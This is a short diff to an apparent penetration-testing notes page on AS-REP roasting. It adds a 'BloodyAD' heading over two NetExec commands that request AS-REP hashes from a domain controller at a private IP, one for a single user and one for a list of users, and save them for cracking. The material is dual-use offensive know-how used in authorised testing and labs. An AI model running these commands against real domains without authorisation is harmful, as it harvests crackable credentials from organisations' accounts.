@@ -9,6 +9,16 @@ metaLinks:
 
 ## Discovery ASREP account
 
+BloodyAD
+
+{% code overflow="wrap" %}
+```bash
+nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
+
+nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
+```
+{% endcode %}
+
 {% code overflow="wrap" %}
 ```powershell
 # ADSearch
